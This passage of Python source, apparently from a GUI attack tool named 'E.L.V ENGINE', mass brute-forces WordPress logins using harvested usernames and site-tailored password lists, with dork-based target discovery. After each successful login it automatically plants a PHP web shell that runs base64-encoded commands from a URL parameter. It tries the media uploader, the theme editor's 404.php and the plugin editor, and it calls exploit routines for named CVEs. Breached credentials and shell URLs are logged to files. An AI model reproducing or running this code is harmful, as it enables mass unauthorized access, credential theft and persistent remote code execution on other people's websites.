        self.dork_maker_button = tk.Button(button_frame, text='[ELV DORK MAKER]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], relief=tk.RAISED, borderwidth=2, command=self.open_dork_maker, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_yellow'], highlightthickness=1)
        self.dork_maker_button.grid(row=1, column=2, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.check_wp_button = tk.Button(button_frame, text='[CHECK WP-LOGIN]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], relief=tk.RAISED, borderwidth=2, command=self.check_wp_login_batch, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_green'], highlightthickness=1)
        self.check_wp_button.grid(row=2, column=0, padx=(6, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.dork_maker_button = tk.Button(button_frame, text='[ELV DORK MAKER]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], relief=tk.RAISED, borderwidth=2, command=self.open_dork_maker, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_yellow'], highlightthickness=1)
        self.dork_maker_button.grid(row=2, column=1, padx=(6, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.dork_scanner_button = tk.Button(button_frame, text='[DORK SCANNER]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], relief=tk.RAISED, borderwidth=2, command=self.open_dork_scanner, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        self.dork_scanner_button.grid(row=2, column=2, padx=(6, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        button_frame.rowconfigure(0, weight=1, uniform='button_row')
        button_frame.rowconfigure(1, weight=1, uniform='button_row')
        button_frame.rowconfigure(2, weight=1, uniform='button_row')

    def log(self, message, color=None):
        """Add log message"""
        if color is None:
            color_tag = 'green'
        elif color == self.colors['fg_green']:
            color_tag = 'green'
        elif color == self.colors['fg_cyan']:
            color_tag = 'cyan'
        elif color == self.colors['fg_yellow']:
            color_tag = 'yellow'
        elif color == self.colors['fg_red']:
            color_tag = 'red'
        else:
            color_tag = 'green'
        timestamp = time.strftime('[%H:%M:%S]')
        log_message = f'{timestamp} {message}\n'
        self.log_queue.put((log_message, color_tag))

    def process_log_queue(self):
        """Process log queue - REAL-TIME dengan auto-clear setelah 100 lines"""
        processed = False
        try:
            while True:
                log_message, color_tag = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_message, color_tag)
                self.log_text.see(tk.END)
                processed = True
                try:
                    line_count = int(self.log_text.index('end-1c').split('.')[0])
                    if line_count >= 100:
                        self.log_text.delete(1.0, f'{line_count - 50}.0')
                        self.log_text.insert(f'{line_count - 50}.0', '[... Log cleared, keeping last 50 lines ...]\n', 'yellow')
                        self.log_text.see(tk.END)
                except Exception:
                    pass
        except queue.Empty:
            pass
        except Exception:
            pass
        self.root.after(100, self.process_log_queue)

    def process_stats_queue(self):
        """Process stats queue - REAL-TIME update (NON-BLOCKING)"""
        updated = False
        try:
            for _ in range(10):
                try:
                    stats_data = self.stats_queue.get_nowait()
                    with self.stats_lock:
                        if 'total' in stats_data:
                            self.stats['total'] = stats_data['total']
                        if 'processed' in stats_data:
                            self.stats['processed'] = stats_data['processed']
                        if 'success' in stats_data:
                            self.stats['success'] = stats_data['success']
                        if 'failed' in stats_data:
                            self.stats['failed'] = stats_data['failed']
                        if 'skipped' in stats_data:
                            self.stats['skipped'] = stats_data['skipped']
                    updated = True
                except queue.Empty:
                    break
        except Exception:
            pass
        if updated:
            self.update_stats()
        try:
            if hasattr(self, 'progress_data'):
                pd = self.progress_data
                status = pd.get('status', 'ATTACKING')
                threads_val = pd.get('threads', 0)
                speed_val = pd.get('speed', 0)
                attempts_val = pd.get('attempts', 0)
                self.progress_label.config(text=f'[STATUS] {status} | [THREADS] {threads_val} | [SPEED] {speed_val} req/s | [ATTEMPTS] {attempts_val}')
                try:
                    delattr(self, 'progress_data')
                except:
                    pass
        except Exception:
            pass
        self.root.after(200, self.process_stats_queue)

    def browse_target_file(self):
        """Browse for target file"""
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, filename)

    def browse_wordlist(self):
        """Browse for wordlist file"""
        filename = filedialog.askopenfilename(title='Select Wordlist File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, filename)

    def generate_passwords(self):
        """Generate password combinations dari analisa URL list"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror('Error', 'Please enter a target URL or select a target file first!')
            return
        targets = []
        if os.path.isfile(target):
            try:
                with open(target, 'r', encoding='utf-8') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror('Error', f'Error reading target file: {str(e)}')
                return
        else:
            targets = [target]
        if not targets:
            messagebox.showerror('Error', 'No valid targets found!')
            return
        self.generate_button.config(state=tk.DISABLED)
        thread = threading.Thread(target=self.generate_passwords_worker, args=(targets,), daemon=True)
        thread.start()

    def generate_passwords_worker(self, targets):
        """Worker untuk generate passwords"""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        engine = ELVBruteforceEngine()
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        password_file = f'password_generate_{timestamp}.txt'
        self.colors['generated_passwords_file'] = password_file
        self.log(f'[GENERATE] Starting password generation for {len(targets)} targets...', self.colors['fg_purple'])
        self.log(f'[GENERATE] Output file: {password_file}', self.colors['fg_cyan'])
        all_passwords = set()
        processed = 0

        def analyze_target(url):
            nonlocal processed
            try:
                url = engine.normalize_url(url)
                domain_info = engine.analyze_domain(url)
                domain = domain_info.get('domain', '')
                usernames = []
                try:
                    usernames = engine.get_usernames_from_wpjson(url, timeout=5)
                except:
                    pass
                if not usernames:
                    usernames = engine.generate_smart_usernames(url)[:5]
                target_passwords = set()
                for uname in usernames[:3]:
                    try:
                        passwords = engine.generate_smart_passwords(uname, url, None, {}, domain_info)
                        target_passwords.update(passwords[:50])
                    except:
                        pass
                processed += 1
                if target_passwords:
                    self.log(f'[GENERATE] {url} | Domain: {domain} | Generated: {len(target_passwords)} passwords', self.colors['fg_green'])
                else:
                    self.log(f'[GENERATE] {url} | Domain: {domain} | No passwords generated', self.colors['fg_yellow'])
                return target_passwords
            except Exception:
                processed += 1
                return set()
        try:
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = {executor.submit(analyze_target, target): target for target in targets[:50]}
                for future in as_completed(futures):
                    try:
                        target_passwords = future.result(timeout=10)
                        all_passwords.update(target_passwords)
                        if len(all_passwords) % 100 == 0:
                            self.log(f'[GENERATE] Progress: {processed}/{len(targets)} | Total passwords: {len(all_passwords)}', self.colors['fg_cyan'])
                    except Exception:
                        pass
        except Exception:
            pass
        try:
            with open(password_file, 'w', encoding='utf-8') as f:
                for pwd in sorted(all_passwords):
                    if pwd and len(pwd) >= 3:
                        f.write(f'{pwd}\n')
            self.log(f'[GENERATE] COMPLETED! Generated {len(all_passwords)} unique passwords', self.colors['fg_green'])
            self.log(f'[GENERATE] Saved to: {password_file}', self.colors['fg_green'])
            self.root.after(0, lambda: messagebox.showinfo('Success', f'Generated {len(all_passwords)} passwords!\nSaved to: {password_file}'))
        except Exception as e:
            self.log(f'[GENERATE] ERROR: {str(e)}', self.colors['fg_red'])
            self.root.after(0, lambda: messagebox.showerror('Error', f'Error saving passwords: {str(e)}'))
        self.root.after(0, lambda: self.generate_button.config(state=tk.NORMAL))

    def clear_logs(self):
        """Clear log output"""
        self.log_text.delete(1.0, tk.END)
        self.results_text.delete(1.0, tk.END)
        self.log('[CLEAR] All logs cleared', self.colors['fg_yellow'])

    def update_stats(self):
        """Update statistics display - REAL-TIME"""
        stats_text = f"STATS: Total: {self.stats['total']} | Processed: {self.stats['processed']} | Success: {self.stats['success']} | Failed: {self.stats['failed']} | Skipped: {self.stats['skipped']}"
        self.stats_label.config(text=stats_text)
        self.root.update_idletasks()

    def start_bruteforce(self):
        """Start brute force"""
        if self.is_running:
            return
        target = self.target_entry.get().strip()
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        proxy = self.proxy_entry.get().strip()
        try:
            threads = int(self.threads_entry.get().strip() or '3')
            threads = min(threads, 5)
        except:
            threads = 3
        try:
            timeout = int(self.timeout_entry.get().strip() or '10')
        except:
            timeout = 10
        if not target:
            messagebox.showerror('Error', 'Please enter a target URL or select a target file!')
            return
        targets = []
        if os.path.isfile(target):
            try:
                with open(target, 'r', encoding='utf-8') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror('Error', f'Error reading target file: {str(e)}')
                return
        else:
            targets = [target]
        if not targets:
            messagebox.showerror('Error', 'No valid targets found!')
            return
        self.is_running = True
        self.stop_flag = False
        self.results = []
        self.stats = {'total': len(targets), 'processed': 0, 'success': 0, 'failed': 0, 'skipped': 0}
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.results_url_file = f'bruteforce_urls_{timestamp}.txt'
        try:
            with open(self.results_url_file, 'w', encoding='utf-8') as f:
                f.write(f"# Brute Force Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Format: wp-login.php#username@password\n\n')
        except:
            pass
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.log(f'[START] {len(targets)} targets | {threads} threads', self.colors['fg_green'])
        self.log(f'[AUTO-SAVE] Results will be saved to: {self.results_url_file}', self.colors['fg_cyan'])
        thread = threading.Thread(target=self.bruteforce_worker, args=(targets, username, password, wordlist, proxy, threads, timeout), daemon=True)
        thread.start()

    def stop_bruteforce(self):
        """Stop brute force"""
        self.stop_flag = True
        self.log('[STOP] Attack halted', self.colors['fg_yellow'])
        self.progress_label.config(text='[STATUS] STOPPED | [THREADS] 0 | [SPEED] 0 req/s')

    def bruteforce_worker(self, targets, username, password, wordlist, proxy, threads, timeout):
        """Brute force worker thread"""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        engine = ELVBruteforceEngine()
        if proxy:
            engine.set_proxy(proxy)
        self.last_update_time = time.time()
        self.last_processed_count = 0

        def bruteforce_target(original_url):
            if self.stop_flag:
                return
            credentials_from_url = engine.extract_credentials_from_url(original_url)
            if credentials_from_url:
                cred_username = credentials_from_url['username']
                cred_password = credentials_from_url['password']
                self.log(f'[URL-CREDS] Found credentials in URL: {cred_username}@{cred_password[:10]}...', self.colors['fg_cyan'])
                normalized_url = engine.normalize_url(original_url)
                try:
                    result = engine.test_login(normalized_url, cred_username, cred_password, timeout)
                    if result and result.get('success'):
                        self.log(f'[SUCCESS] {normalized_url} | {cred_username}:{cred_password}', self.colors['fg_green'])
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['success'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success']})
                        result_text = f'[BREACHED] {normalized_url} | User: {cred_username} | Pass: {cred_password} | Method: URL-FRAGMENT\n'
                        self.root.after_idle(lambda rt=result_text: self.results_text.insert(tk.END, rt, 'green'))
                        self.root.after_idle(lambda: self.results_text.see(tk.END))
                        self.results.append({'url': normalized_url, 'username': cred_username, 'password': cred_password, 'method': 'URL-FRAGMENT'})
                        return
                    else:
                        self.log(f'[FAILED] URL credentials invalid for {normalized_url}', self.colors['fg_yellow'])
                except:
                    pass
            url = engine.normalize_url(original_url)
            try:
                usernames = []
                try:
                    usernames = engine.get_usernames_from_wpjson(url, timeout)
                    if usernames:
                        self.log(f'[WP-JSON] Found usernames: {usernames}', self.colors['fg_green'])
                except Exception as e:
                    usernames = []
                if not usernames:
                    try:
                        smart_usernames = engine.generate_smart_usernames(url)
                        if username:
                            usernames = [username] + smart_usernames[:10]
                        else:
                            usernames = smart_usernames[:15]
                        self.log(f'[FALLBACK] Using generated usernames: {usernames[:5]}...', self.colors['fg_yellow'])
                    except Exception:
                        usernames = ['admin', 'administrator', 'user', 'test']
                if not usernames:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    if not engine.check_xmlrpc(url, timeout):
                        self.log(f'[SKIP] {url} - No XML-RPC (required for WP brute)', self.colors['fg_yellow'])
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['skipped'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                        return
                except Exception:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    if not engine.check_wp_login(url, timeout):
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['skipped'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                        return
                except Exception:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    domain_info = engine.analyze_domain(url)
                    context_data = {}
                except Exception:
                    domain_info = {}
                    context_data = {}
                failed_passwords = []
                total_attempts = 0
                max_attempts = 200
                for uname in usernames:
                    if self.stop_flag:
                        return
                    try:
                        if password:

                            def password_gen():
                                try:
                                    yield password
                                except GeneratorExit:
                                    return
                            user_passwords_gen = password_gen()
                            total_passwords = 1
                        elif self.colors.get('generated_passwords_file') and os.path.exists(self.colors['generated_passwords_file']):

                            def generated_passwords_gen():
                                try:
                                    with open(self.colors['generated_passwords_file'], 'r', encoding='utf-8') as f:
                                        count = 0
                                        for line in f:
                                            if self.stop_flag:
                                                break
                                            pwd = line.strip()
                                            if pwd and count < max_attempts:
                                                yield pwd
                                                count += 1
                                except GeneratorExit:
                                    return
                                except:
                                    pass
                            try:
                                with open(self.colors['generated_passwords_file'], 'r', encoding='utf-8') as f:
                                    total_passwords = min(sum((1 for _ in f)), max_attempts)
                            except:
                                total_passwords = max_attempts
                            user_passwords_gen = generated_passwords_gen()
                            self.log(f'[LOAD] Using generated passwords from file: {total_passwords} passwords', self.colors['fg_cyan'])
                        elif wordlist:

                            def wordlist_gen():
                                try:
                                    with open(wordlist, 'r', encoding='utf-8') as f:
                                        count = 0
                                        for line in f:
                                            if self.stop_flag:
                                                break
                                            pwd = line.strip()
                                            if pwd and count < max_attempts:
                                                yield pwd
                                                count += 1
                                except GeneratorExit:
                                    return
                                except:
                                    try:
                                        for pwd in engine.generate_smart_passwords(uname, url, failed_passwords, context_data, domain_info)[:max_attempts]:
                                            if self.stop_flag:
                                                break
                                            yield pwd
                                    except GeneratorExit:
                                        return
                            try:
                                with open(wordlist, 'r', encoding='utf-8') as f:
                                    total_passwords = min(sum((1 for _ in f)), max_attempts)
                            except:
                                total_passwords = max_attempts
                            user_passwords_gen = wordlist_gen()
                        else:
                            passwords_list = engine.generate_smart_passwords(uname, url, failed_passwords, context_data, domain_info)[:max_attempts]
                            total_passwords = len(passwords_list)

                            def smart_passwords_gen():
                                for pwd in passwords_list:
                                    yield pwd
                            user_passwords_gen = smart_passwords_gen()
                        if not password and (not wordlist) and (total_passwords == 0):
                            passwords_list = ['admin', 'password', '123456', 'admin123', 'password123']
                            total_passwords = len(passwords_list)

                            def fallback_gen():
                                try:
                                    for pwd in passwords_list:
                                        if self.stop_flag:
                                            break
                                        yield pwd
                                except GeneratorExit:
                                    return
                            user_passwords_gen = fallback_gen()
                    except Exception:
                        passwords_list = ['admin', 'password', '123456', 'admin123', 'password123']
                        total_passwords = len(passwords_list)

                        def fallback_gen():
                            try:
                                for pwd in passwords_list:
                                    if self.stop_flag:
                                        break
                                    yield pwd
                            except GeneratorExit:
                                return
                        user_passwords_gen = fallback_gen()
                    if total_passwords > 0:
                        self.log(f'[BRUTE] {url} | User: {uname} | Passwords: {total_passwords}', self.colors['fg_cyan'])
                    attempts = 0
                    try:
                        for pwd in user_passwords_gen:
                            if self.stop_flag:
                                return
                            if attempts >= max_attempts:
                                break
                            attempts += 1
                            total_attempts += 1
                            if attempts % 50 == 0:
                                self.log(f'[TRY] {url} | {uname} | Attempt {attempts}/{total_passwords}', self.colors['fg_cyan'])
                            if attempts % 3 == 0 and attempts > 0:
                                time.sleep(0.5)
                            try:
                                success, _ = engine.test_login(url, uname, pwd, timeout)
                            except Exception as e:
                                success = False
                    except GeneratorExit:
                        return
                        if attempts % 50 == 0:
                            try:
                                import gc
                                gc.collect()
                            except:
                                pass
                        try:
                            current_time = time.time()
                            if current_time - self.last_update_time >= 0.5:
                                with self.stats_lock:
                                    try:
                                        time_diff = current_time - self.last_update_time
                                        if time_diff > 0:
                                            speed = int((self.stats['processed'] - self.last_processed_count) / time_diff)
                                        else:
                                            speed = 0
                                    except:
                                        speed = 0
                                    try:
                                        self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success'], 'failed': self.stats['failed'], 'skipped': self.stats['skipped']})
                                    except:
                                        pass
                                    try:
                                        self.progress_data = {'threads': threads, 'speed': speed, 'attempts': attempts}
                                    except:
                                        pass
                                self.last_update_time = current_time
                                self.last_processed_count = self.stats['processed']
                        except Exception:
                            pass
                        if success:
                            result = {'url': url, 'username': uname, 'password': pwd, 'status': 'SUCCESS', 'attempts': attempts}
                            shell_result = self.upload_shell_after_login(url, uname, pwd, timeout, engine)
                            if shell_result and shell_result.get('success'):
                                result['shell_url'] = shell_result.get('shell_url')
                                result['exploit_method'] = shell_result.get('method', 'N/A')
                                self.log(f"[SHELL UPLOADED] {url} | Method: {shell_result.get('method', 'N/A')} | Shell: {shell_result.get('shell_url', 'N/A')}", self.colors['fg_purple'])
                            with self.stats_lock:
                                self.results.append(result)
                                self.stats['processed'] += 1
                                self.stats['success'] += 1
                                self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success']})
                            self.log(f'[!!! BREACH SUCCESSFUL !!!] {url} | {uname}:{pwd} | Attempts: {attempts}', self.colors['fg_green'])
                            login_url = f'{url}/wp-login.php#{uname}@{pwd}'
                            shell_info = f" | SHELL: {shell_result.get('shell_url', 'N/A')}" if shell_result and shell_result.get('success') else ''
                            try:
                                if hasattr(self, 'results_url_file') and self.results_url_file:
                                    with open(self.results_url_file, 'a', encoding='utf-8') as f:
                                        f.write(f'{login_url}{shell_info}\n')
                            except:
                                pass
                            result_text = f'[BREACHED] {url} | User: {uname} | Pass: {pwd} | Attempts: {attempts}{shell_info}\n'
                            self.root.after_idle(lambda rt=result_text: self.results_text.insert(tk.END, rt, 'green'))
                            self.root.after_idle(lambda: self.results_text.see(tk.END))
                            self.progress_data = {'threads': threads, 'speed': 0, 'attempts': attempts, 'status': 'BREACHED!'}
                            return
                        elif pwd not in failed_passwords:
                            failed_passwords.append(pwd)
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['failed'] += 1
                    self.stats_queue.put({'processed': self.stats['processed'], 'failed': self.stats['failed']})
                self.log(f'[FAILED] {url} | Attempts: {total_attempts}', self.colors['fg_red'])
            except Exception as e:
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['skipped'] += 1
                    self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
        try:
            max_workers = min(threads, 3)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for i, target in enumerate(targets):
                    if self.stop_flag:
                        break
                    futures[executor.submit(bruteforce_target, target)] = target
                    if i % 20 == 0 and i > 0:
                        time.sleep(0.2)
                for future in as_completed(futures):
                    if self.stop_flag:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        future.result(timeout=15)
                    except Exception:
                        pass
                    if not self.stop_flag:
                        time.sleep(0.1)
        except Exception:
            pass
        self.is_running = False
        self.root.after_idle(self.bruteforce_finished)

    def upload_shell_after_login(self, url, username, password, timeout, engine):
        """Auto upload shell setelah login berhasil - dengan CVE exploit juga"""
        try:
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            proxy = None
            if engine and hasattr(engine, 'proxy') and engine.proxy:
                proxy = engine.proxy
                session.proxies = {'http': proxy, 'https': proxy}
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            resp = session.get(login_url, timeout=timeout, verify=False)
            nonce = ''
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                if nonce_input:
                    nonce = nonce_input.get('value', '')
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1', '_wpnonce': nonce}
            login_resp = session.post(login_url, data=login_data, timeout=timeout, verify=False, allow_redirects=True)
            if 'wp-admin' not in login_resp.url and 'dashboard' not in login_resp.text.lower():
                return None
            cve_exploits = [('CVE-2025-5961', self.exploit_CVE_2025_5961), ('CVE-2025-62047', self.exploit_CVE_2025_62047), ('CVE-2025-6389', self.exploit_CVE_2025_6389)]
            for cve_id, exploit_func in cve_exploits:
                try:
                    result = exploit_func(url, timeout, proxy)
                    if result and result.get('shell_url'):
                        return {'success': True, 'method': f'{cve_id}-exploit', 'shell_url': result.get('shell_url')}
                except Exception:
                    continue
            exploit_methods = [self.upload_shell_via_media_upload, self.upload_shell_via_theme_editor, self.upload_shell_via_plugin_editor]
            for method in exploit_methods:
                try:
                    result = method(session, url, timeout)
                    if result and result.get('success'):
                        return result
                except Exception:
                    continue
            return None
        except Exception:
            return None

    def upload_shell_via_theme_editor(self, session, url, timeout):
        """Upload shell via WordPress Theme Editor - edit 404.php atau functions.php"""
        try:
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            theme_editor_url = urljoin(url.rstrip('/'), '/wp-admin/theme-editor.php')
            resp = session.get(theme_editor_url + '?file=404.php', timeout=timeout, verify=False)
            theme_match = re.search('name="theme"\\s+value="([^"]+)"', resp.text)
            if not theme_match:
                theme = 'twentytwentythree'
            else:
                theme = theme_match.group(1)
            nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
            nonce = nonce_match.group(1) if nonce_match else ''
            update_data = {'theme': theme, 'file': '404.php', 'newcontent': shell_content, 'action': 'update', '_wpnonce': nonce}
            update_resp = session.post(theme_editor_url, data=update_data, timeout=timeout, verify=False)
            if update_resp.status_code == 200:
                shell_url = urljoin(url, '/wp-content/themes/' + theme + '/404.php')
                test_resp = session.get(shell_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=5, verify=False)
                if 'OK' in test_resp.text:
                    return {'success': True, 'method': 'theme-editor-404', 'shell_url': shell_url}
        except:
            pass
        return None

    def upload_shell_via_plugin_editor(self, session, url, timeout):
        """Upload shell via WordPress Plugin Editor"""
        try:
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            plugin_editor_url = urljoin(url.rstrip('/'), '/wp-admin/plugin-editor.php')
            resp = session.get(plugin_editor_url, timeout=timeout, verify=False)
            plugin_match = re.search('name="plugin"\\s+value="([^"]+)"', resp.text)
            file_match = re.search('name="file"\\s+value="([^"]+)"', resp.text)
            if plugin_match and file_match:
                plugin = plugin_match.group(1)
                file_path = file_match.group(1)
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
                update_data = {'plugin': plugin, 'file': file_path, 'newcontent': shell_content, 'action': 'update', '_wpnonce': nonce}
                update_resp = session.post(plugin_editor_url, data=update_data, timeout=timeout, verify=False)
                if update_resp.status_code == 200:
                    shell_url = urljoin(url, f'/wp-content/plugins/{plugin}/{file_path}')
                    test_resp = session.get(shell_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=5, verify=False)
                    if 'OK' in test_resp.text:
                        return {'success': True, 'method': 'plugin-editor', 'shell_url': shell_url}
        except:
            pass
        return None

    def upload_shell_via_media_upload(self, session, url, timeout):
        """Upload shell via WordPress Media Upload"""
        try:
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            upload_url = urljoin(url.rstrip('/'), '/wp-admin/async-upload.php')
            files = {'async-upload': (shell_name, shell_content, 'application/x-php')}
            data = {'name': shell_name, 'action': 'upload-attachment'}
            resp = session.post(upload_url, files=files, data=data, timeout=timeout, verify=False)
            if resp.status_code == 200:
                try:
                    import json
                    result = resp.json()
                    if result.get('success'):
                        file_url = result.get('data', {}).get('url', '')
                        if file_url:
                            test_resp = session.get(file_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=5, verify=False)
                            if 'OK' in test_resp.text:
                                return {'success': True, 'method': 'media-upload', 'shell_url': file_url}
                except:
                    pass
            current_year = time.strftime('%Y')
            current_month = time.strftime('%m')
            shell_urls = [urljoin(url, f'/wp-content/uploads/{shell_name}'), urljoin(url, f'/wp-content/uploads/{current_year}/{current_month}/{shell_name}')]
            for shell_url in shell_urls:
                test_resp = session.get(shell_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=5, verify=False)
                if 'OK' in test_resp.text:
                    return {'success': True, 'method': 'media-upload', 'shell_url': shell_url}
        except:
            pass
        return None

    def upload_shell_via_plugin_installer(self, session, url, timeout):
        """Upload shell via Plugin Installer (as plugin) - Skip untuk sekarang karena kompleks"""
        return None

    def bruteforce_finished(self):
        """Called when brute force is finished"""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress_label.config(text='[STATUS] COMPLETED | [THREADS] 0 | [SPEED] 0 req/s')
        self.log(f"[DONE] Success: {self.stats['success']} | Failed: {self.stats['failed']} | Skipped: {self.stats['skipped']}", self.colors['fg_yellow'])
        if self.results:
            self.log(f'[BREACHED] {len(self.results)} target(s) found!', self.colors['fg_green'])

    def save_results(self):
        """Save results to file"""
        if not self.results:
            messagebox.showwarning('Warning', 'No results to save!')
            self.log('No results to save', self.colors['fg_yellow'])
            return
        filename = filedialog.asksaveasfilename(title='Save Results', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('JSON files', '*.json'), ('All files', '*.*')])
        if filename:
            try:
                if filename.endswith('.json'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=2, ensure_ascii=False)
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('E.L.V ENGINE - Brute Force Results\n')
                        f.write('=' * 60 + '\n\n')
                        for result in self.results:
                            url = result.get('url', '')
                            username = result.get('username', '')
                            password = result.get('password', '')
                            login_url = f'{url}/wp-login.php#{username}@{password}'
                            f.write(f'{login_url}\n')
                self.log(f'Results saved to: {filename}', self.colors['fg_green'])
                messagebox.showinfo('Success', f'Results saved to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving results: {str(e)}')
        if hasattr(self, 'results_url_file') and self.results_url_file and os.path.exists(self.results_url_file):
            self.log(f'Auto-saved results also available at: {self.results_url_file}', self.colors['fg_cyan'])

    def open_dork_maker(self):
        try:
            dork_window = tk.Toplevel(self.root)
            dork_window.title('Dork Maker - Search Query Generator')
            dork_window.geometry('1100x750')
            dork_window.configure(bg=BG_DARK)
            DorkMakerGUI(dork_window)
        except Exception as e:
            messagebox.showerror('Error', f'Error opening Dork Maker: {str(e)}')

    def open_dork_scanner(self):
        try:
            scanner_window = tk.Toplevel(self.root)
            scanner_window.title('Dork Scanner - Search Engine Scanner')
            scanner_window.geometry('1500x900')
            scanner_window.configure(bg=BG_DARK)
            DorkScannerGUI(scanner_window)
        except Exception as e:
            messagebox.showerror('Error', f'Error opening Dork Scanner: {str(e)}')

    def check_wp_login_batch(self):
        input_file = filedialog.askopenfilename(title='Select URL List File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if not input_file:
            return
        output_file = filedialog.asksaveasfilename(title='Save WP-login URLs', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if not output_file:
            return
        threads = simpledialog.askinteger('Threads', 'Enter number of threads (default: 250):', initialvalue=250, minvalue=1, maxvalue=500)
        if not threads:
            threads = 250
        timeout = simpledialog.askinteger('Timeout', 'Enter timeout in seconds (default: 6):', initialvalue=6, minvalue=1, maxvalue=60)
        if not timeout:
            timeout = 6
        self.log(f'[CHECK WP-LOGIN] Starting check with {threads} threads, timeout {timeout}s...', self.colors['fg_cyan'])
        self.log(f'[CHECK WP-LOGIN] Input: {input_file}', self.colors['fg_cyan'])
        self.log(f'[CHECK WP-LOGIN] Output: {output_file}', self.colors['fg_cyan'])
        thread = threading.Thread(target=self.check_wp_login_worker, args=(input_file, output_file, threads, timeout), daemon=True)
        thread.start()

    def check_wp_login_worker(self, input_file, output_file, threads, timeout):
        """Worker untuk check WP-login.php (logika dari cek1.py)"""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        def normalize(url):
            if not url.startswith('http'):
                return 'http://' + url
            return url

        def check_wp(url):
            if self.stop_flag:
                return None
